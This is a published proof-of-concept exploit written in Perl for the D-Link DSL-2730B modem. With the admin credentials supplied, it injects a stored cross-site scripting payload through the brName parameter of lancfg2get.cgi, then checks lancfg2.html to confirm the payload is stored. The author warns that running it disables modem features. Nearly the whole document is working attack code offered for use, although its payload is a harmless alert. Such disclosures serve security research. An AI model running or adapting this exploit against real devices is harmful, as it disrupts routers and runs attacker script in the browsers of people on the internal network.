# Exploit Title: D-Link DSL-2730B Modem lancfg2get.cgi Exploit XSS Injection Stored
# Date: 11-01-2015
# Exploit Author: Mauricio Correa
# Vendor Homepage: www.dlink.com
# Hardware version: C1
# Version: GE 1.01
# Tested on: Windows 8 and Linux
 

#!/usr/bin/perl
#
# Date dd-mm-aaaa: 11-11-2014
# Exploit for D-Link DSL-2730B
# Cross Site Scripting (XSS Injection) Stored in lancfg2get.cgi
# Developed by Mauricio Corr�a
# XLabs Information Security
# WebSite: www.xlabs.com.br
# More informations: www.xlabs.com.br/blog/?p=339
#
# CAUTION!
# This exploit disables some features of the modem,
# forcing the administrator of the device, accessing the page to reconfigure the modem again,
# occurring script execution in the browser of internal network users.
#
# Use with caution!
# Use at your own risk!
#


use strict;
use warnings;
use diagnostics;
use LWP::UserAgent;
use HTTP::Request;
use URI::Escape;

                my $ip = $ARGV[0];
                my $user = $ARGV[1];
                my $pass = $ARGV[2];
                             
                $ip = $1 if($ip=~/(.*)\/$/);

                               if (@ARGV != 3){

                                               print "\n";
                                               print "XLabs Information Security www.xlabs.com.br\n";
                                               print "Exploit for POC D-Link DSL-2730B Stored XSS Injection in lancfg2get.cgi\n";
                                               print "Developed by Mauricio Correa\n";
                                               print "Contact: mauricio\@xlabs.com.br\n";
                                               print "Usage: perl $0 http:\/\/host_ip\/ user pass\n";
                               }else{
                                               print "XLabs Information Security www.xlabs.com.br\n";
                                               print "Exploit for POC D-Link DSL-2730B Stored XSS Injection in lancfg2get.cgi\n";
                                               print "Developed by Mauricio Correa\n";
                                               print "Contact: mauricio\@xlabs.com.br\n";
                                               print "[+] Exploring $ip\/ ...\n";
 
                                               my $payload = "%27;alert(%27XLabsSec%27);\/\/";
                                           
                                               my $ua = new LWP::UserAgent;
                                               my $hdrs = new HTTP::Headers( Accept => 'text/plain', UserAgent => "XLabs Security Exploit Browser/1.0" );

                                               $hdrs->authorization_basic($user, $pass);
                                             
                                               chomp($ip);
                                             
                                               print "[+] Preparing exploit...\n";
                                            
                                               my $url_and_xpl = "$ip/lancfg2get.cgi?brName=$payload";
                                                                                           
                                               my $req = new HTTP::Request("GET",$url_and_xpl,$hdrs);

                                               print "[+] Prepared!\n";
                                            
                                               print "[+] Requesting and Exploiting...\n";
                                             
                                               my $resp = $ua->request($req);

                                               if ($resp->is_success){

                                               print "[+] Successfully Requested!\n";
                                           
                                             
                                                               my $url = "$ip/lancfg2.html";
                                            
                                                               $req = new HTTP::Request("GET",$url,$hdrs);

                                                               print "[+] Checking that was explored...\n";
                                                           
                                                            
                                                               my $resp2 = $ua->request($req);
                                                        
                                                            
                                                               if ($resp2->is_success){

                                                               my $resultado = $resp2->as_string;
                                                           
                                                                                                             if(index($resultado, uri_unescape($payload)) != -1){
                                                                                                            
                                                                                                              print "[+] Successfully Exploited!";

                                                                                                              }else{
                                                                                                            
                                                                                                              print "[-] Not Exploited!";
                                                                                                           
                                                                                                              }
                                                               }
 
                                               }else {

                                               print "[-] Ops!\n";
                                               print $resp->message;
                                               }

}